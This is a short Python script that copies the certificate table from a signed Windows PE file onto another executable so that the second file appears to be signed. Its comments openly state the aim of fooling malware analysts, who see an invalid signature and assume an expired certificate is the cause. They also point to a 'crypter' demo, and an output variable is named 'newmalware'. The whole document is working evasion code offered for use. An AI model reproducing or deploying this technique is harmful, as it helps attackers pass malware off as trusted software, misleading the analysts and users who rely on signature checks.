## Quick python script to extract cert data from a signed pefile, and fixup headers and attach to another. 
## Gives the impression of a signed executable. 
## Most analysts will just check if an executable is signed, in the case they check to see if it is signed, they will notice that it doesnt validate. If an expired cert is attached, then most analysts will assume that is why it didnt validate. The windows gui is sort of terrible for this, and doesnt make it immediately obvious that payload itself failed a cryptographic check. 
## Oblicagory XKCD: https://xkcd.com/1181/
## check at grifsec.com/crypter.php for demo


import os
import pefile
import sys

srcfile = sys.argv[1]
dstfile = sys.argv[2]
print dstfile

src = pefile.PE(srcfile)
dst = pefile.PE(dstfile)

src_cert_start = src.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].VirtualAddress - 1
dst_cert_start = dst.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].VirtualAddress - 1

if dst_cert_start < 1:
	dst_cert_start = os.path.getsize(dstfile) + 1

src_cert_size = src.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].Size
#dst_cert_size = dst.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].Size


# open file handles
src_handle = open(srcfile, "rb")
src_handle.seek(src_cert_start)
src_cert_data = src_handle.read(src_cert_size + 1);
src_handle.close()


rsrc_loc =  dst.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].VirtualAddress

if rsrc_loc <= 0:
	rsrc_loc = os.path.getsize(dstfile)
	dst.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].VirtualAddress= rsrc_loc ## boom

dst_cert_start = rsrc_loc - 1

dst.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].Size = src_cert_size

print dst_cert_start

newmalware = "newmalware.exe"	
dst.write(dstfile) # commit

dst_handle = open(dstfile, "r+b")
dst_handle.seek(dst_cert_start)
dst_handle.write(src_cert_data)
dst_handle.close()

